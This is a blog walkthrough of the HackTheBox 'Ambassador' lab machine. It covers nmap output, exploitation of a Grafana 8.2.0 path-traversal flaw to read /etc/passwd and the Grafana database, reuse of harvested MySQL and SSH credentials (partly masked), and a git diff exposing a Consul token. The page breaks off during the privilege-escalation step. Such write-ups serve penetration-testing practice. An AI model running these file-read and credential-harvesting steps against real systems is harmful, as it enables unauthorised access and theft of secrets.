<!doctype html>
<html lang="en-us">
  <head>
    <title>HackTheBox Ambassador // 53CTF</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.108.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="5YC10P5" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.1b165e60871be07c93da04ef30238e50223c9da30f957d760f25b24143926af9.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HackTheBox Ambassador"/>
<meta name="twitter:description" content="Name: Ambassador IP: 10.10.11.183 Defficulty: Medium OS: Linux Author: DirectRoot Nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 29dd8ed7171e8e3090873cc651007c75 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5&#43;VCwR&#43;2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa&#43;KPePbz2n&#43;2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ&#43;XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA&#43;97wwNSZG2G/duS6lE8pYz1unL&#43;Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8&#43;SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB&#43;qEq6SY6crjtfpYnd7&#43;2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK&#43;na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc= | 256 80a4c52e9ab1ecda276439a408973bef (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8&#43;SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs= | 256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Hugo 0.94.2 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Ambassador Development Server | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST 3000/tcp open ppp?"/>

    <meta property="og:title" content="HackTheBox Ambassador" />
<meta property="og:description" content="Name: Ambassador IP: 10.10.11.183 Defficulty: Medium OS: Linux Author: DirectRoot Nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 29dd8ed7171e8e3090873cc651007c75 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5&#43;VCwR&#43;2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa&#43;KPePbz2n&#43;2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ&#43;XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA&#43;97wwNSZG2G/duS6lE8pYz1unL&#43;Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8&#43;SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB&#43;qEq6SY6crjtfpYnd7&#43;2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK&#43;na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc= | 256 80a4c52e9ab1ecda276439a408973bef (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8&#43;SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs= | 256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Hugo 0.94.2 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Ambassador Development Server | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST 3000/tcp open ppp?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://53ctf.github.io/posts/htb/ambassador/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-16T16:15:16+05:30" />
<meta property="article:modified_time" content="2023-01-16T16:15:16+05:30" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://53ctf.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="5YC10P5" /></a>
      <span class="app-header-title">53CTF</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/hackthebox/">HTB</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/notes/">Notes</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p>This is where I keep my notes and also where I post articles, writeups, walkthroughs and stuff like that so everybody else can learn something out of it.....</p>
      <div class="app-header-social">
        
          <a href="https://github.com/53ctf" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/syclops101" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="https://web.facebook.com/syclops101" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
  <title>HackTheBox</title>
  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">HackTheBox Ambassador</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jan 16, 2023
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          6 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://53ctf.github.io/tags/hackthebox/">HackTheBox</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <ul>
<li>Name: Ambassador</li>
<li>IP: 10.10.11.183</li>
<li>Defficulty: Medium</li>
<li>OS: Linux</li>
<li>Author: <a href="https://www.hackthebox.com/home/users/profile/24906">DirectRoot</a></li>
</ul>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE REASON  VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 29dd8ed7171e8e3090873cc651007c75 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 80a4c52e9ab1ecda276439a408973bef <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> f590ba7ded55cb7007f2bbc891931bf6 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W
</span></span><span style="display:flex;"><span>80/tcp   open  http    syn-ack Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-generator: Hugo 0.94.2
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Ambassador Development Server
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_  Supported Methods: OPTIONS HEAD GET POST
</span></span><span style="display:flex;"><span>3000/tcp open  ppp?    syn-ack
</span></span><span style="display:flex;"><span>| fingerprint-strings:
</span></span><span style="display:flex;"><span>|   FourOhFourRequest:
</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">302</span> Found
</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Expires: -1
</span></span><span style="display:flex;"><span>|     Location: /login
</span></span><span style="display:flex;"><span>|     Pragma: no-cache
</span></span><span style="display:flex;"><span>|     Set-Cookie: redirect_to<span style="color:#f92672">=</span>%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
</span></span><span style="display:flex;"><span>|     X-Frame-Options: deny
</span></span><span style="display:flex;"><span>|     X-Xss-Protection: 1; mode<span style="color:#f92672">=</span>block
</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">16</span> Jan <span style="color:#ae81ff">2023</span> 10:49:16 GMT
</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">29</span>
</span></span><span style="display:flex;"><span>|     href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
</span></span><span style="display:flex;"><span>|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     Request
</span></span><span style="display:flex;"><span>|   GetRequest:
</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">302</span> Found
</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Expires: -1
</span></span><span style="display:flex;"><span>|     Location: /login
</span></span><span style="display:flex;"><span>|     Pragma: no-cache
</span></span><span style="display:flex;"><span>|     Set-Cookie: redirect_to<span style="color:#f92672">=</span>%2F; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
</span></span><span style="display:flex;"><span>|     X-Frame-Options: deny
</span></span><span style="display:flex;"><span>|     X-Xss-Protection: 1; mode<span style="color:#f92672">=</span>block
</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">16</span> Jan <span style="color:#ae81ff">2023</span> 10:48:40 GMT
</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">29</span>
</span></span><span style="display:flex;"><span>|     href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
</span></span><span style="display:flex;"><span>|   HTTPOptions:
</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">302</span> Found
</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache
</span></span><span style="display:flex;"><span>|     Expires: -1
</span></span><span style="display:flex;"><span>|     Location: /login
</span></span><span style="display:flex;"><span>|     Pragma: no-cache
</span></span><span style="display:flex;"><span>|     Set-Cookie: redirect_to<span style="color:#f92672">=</span>%2F; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
</span></span><span style="display:flex;"><span>|     X-Frame-Options: deny
</span></span><span style="display:flex;"><span>|     X-Xss-Protection: 1; mode<span style="color:#f92672">=</span>block
</span></span><span style="display:flex;"><span>|     Date: Mon, <span style="color:#ae81ff">16</span> Jan <span style="color:#ae81ff">2023</span> 10:48:47 GMT
</span></span><span style="display:flex;"><span>|_    Content-Length: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2
</span></span><span style="display:flex;"><span>| mysql-info:
</span></span><span style="display:flex;"><span>|   Protocol: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>|   Version: 8.0.30-0ubuntu0.20.04.2
</span></span><span style="display:flex;"><span>|   Thread ID: <span style="color:#ae81ff">45</span>
</span></span><span style="display:flex;"><span>|   Capabilities flags: <span style="color:#ae81ff">65535</span>
</span></span><span style="display:flex;"><span>|   Some Capabilities: Support41Auth, ConnectWithDatabase, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, SupportsCompression, ODBCClient, IgnoreSigpipes, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, LongColumnFlag, InteractiveClient, SupportsTransactions, FoundRows, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
</span></span><span style="display:flex;"><span>|   Status: Autocommit
</span></span><span style="display:flex;"><span>|   Salt: <span style="color:#ae81ff">\x</span>18m<span style="color:#ae81ff">\x</span>16K&lt;<span style="color:#ae81ff">\x</span>17@<span style="color:#f92672">[</span><span style="color:#ae81ff">\x</span>11EkhkykK+5!.
</span></span><span style="display:flex;"><span>|_  Auth Plugin Name: caching_sha2_password
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Keyspace</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Four ports are open.</p>
<ul>
<li><strong>22/TCP SSH</strong>
<ul>
<li>OpenSSH 8.2p1</li>
<li>And its banner says that this is a <a href="https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.5">Ubuntu</a> box</li>
</ul>
</li>
<li><strong>80/TCP HTTP</strong>
<ul>
<li>Apache httpd 2.4.41</li>
</ul>
</li>
<li><strong>3000/TCP HTTP</strong>
<ul>
<li>Apache httpd 2.4.41</li>
</ul>
</li>
<li><strong>3306/TCP MySQL</strong>
<ul>
<li>MySQL 8.0.30</li>
</ul>
</li>
</ul>
<h2 id="web-enumeration-port-80">Web Enumeration [Port 80]</h2>
<p>There are nothing interesting in this website except for this message.</p>
<pre tabindex="0"><code>Use the developer account to SSH, DevOps will give you the password.
</code></pre><p>According to this we can ssh into the box as an developer via SSH. But to do that, someone called <strong>DevOps</strong> needs to give us the password. I have no idea what that means&hellip;lol</p>
<h2 id="web-enumeration-port-3000">Web Enumeration [Port 3000]</h2>
<p>Its a <a href="https://grafana.com/">Grafana</a> login form. Grafana is a multi-platform open source analytics and interactive visualization web application written in <a href="https://go.dev/">Go</a>. And we can see the version of the Grafana which is <a href="https://grafana.com/docs/grafana/latest/release-notes/release-notes-8-2-0/">v8.2.0 (d7f71e9eae)</a>.</p>
<p>If we look for any exploits for that version, we can find there is a <a href="https://www.exploit-db.com/exploits/50581">Directory Traversal and Arbitrary File Read</a> Vulnerability.</p>
<p>With that we can read files from the box.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; python3 exploit.py -H http://10.10.11.183:3000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read file &gt; /etc/passwd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>developer:x:1000:1000:developer:/home/developer:/bin/bash
</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style="display:flex;"><span>grafana:x:113:118::/usr/share/grafana:/bin/false
</span></span><span style="display:flex;"><span>mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>consul:x:997:997::/home/consul:/bin/false
</span></span></code></pre></div><p>Looks like we one have one user on the box name <code>developer</code>. Let&rsquo;s try to read some other files too.
Using <a href="https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798">this</a> I downloaded the <code>gafana.db</code> file. I opened it using <a href="https://sqlitebrowser.org/">sqlitebrowser</a>.</p>
<h2 id="fooothold-developer">Fooothold [Developer]</h2>
<p>I found some credentials from the <code>data_sorce</code> table.
<img src="images/creds.png" alt="Creds"></p>
<p>With that credentials, we can login to the SQL database of the box.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; mysql -u grafana -p<span style="color:#e6db74">&#39;don********************21!&#39;</span> -h 10.10.11.183
</span></span></code></pre></div><p>From that we can get the SSH credentials for the user <code>developer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>MySQL [whackywidget]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-----------+------------------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#66d9ef">user</span>      <span style="color:#f92672">|</span> pass                                     <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-----------+------------------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> developer <span style="color:#f92672">|</span> YW5<span style="color:#f92672">**********************************</span><span style="color:#66d9ef">g</span><span style="color:#f92672">==</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">-----------+------------------------------------------+
</span></span></span></code></pre></div><p>Decode the base64 encoded password and login to the box as the user <code>developer</code> and then you can capture the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-bash-5.0$ whoami
</span></span><span style="display:flex;"><span>developer
</span></span><span style="display:flex;"><span>-bash-5.0$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>-bash-5.0$ cat user.txt
</span></span><span style="display:flex;"><span>c20**************************c13
</span></span></code></pre></div><h2 id="privesc-root">Privesc [Root]</h2>
<p>In <code>/opt</code> we can see that there is two directories names <code>consul</code> and <code>my-app</code>. When we go into the <code>my-app</code> directory, we can see a <code>.git</code> direcotory in there. So, now maybe we can view some git commits to see if there is anything usefull in there.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; git show 33a53ef9a207976d5ceceddc41a199558843bf3c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit 33a53ef9a207976d5ceceddc41a199558843bf3c <span style="color:#f92672">(</span>HEAD -&gt; main<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Author: Developer &lt;developer@ambassador.local&gt;
</span></span><span style="display:flex;"><span>Date:   Sun Mar <span style="color:#ae81ff">13</span> 23:47:36 <span style="color:#ae81ff">2022</span> +0000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    tidy config script
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
</span></span><span style="display:flex;"><span>index 35c08f6..fc51ec0 <span style="color:#ae81ff">100755</span>
</span></span><span style="display:flex;"><span>--- a/whackywidget/put-config-in-consul.sh
</span></span><span style="display:flex;"><span>+++ b/whackywidget/put-config-in-consul.sh
</span></span><span style="display:flex;"><span>@@ -1,4 +1,4 @@
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># We use Consul for application config in production, this script will help set the correct values for the app</span>
</span></span><span style="display:flex;"><span>-# Export MYSQL_PASSWORD before running
</span></span><span style="display:flex;"><span>+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
</span></span><span style="display:flex;"><span>+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
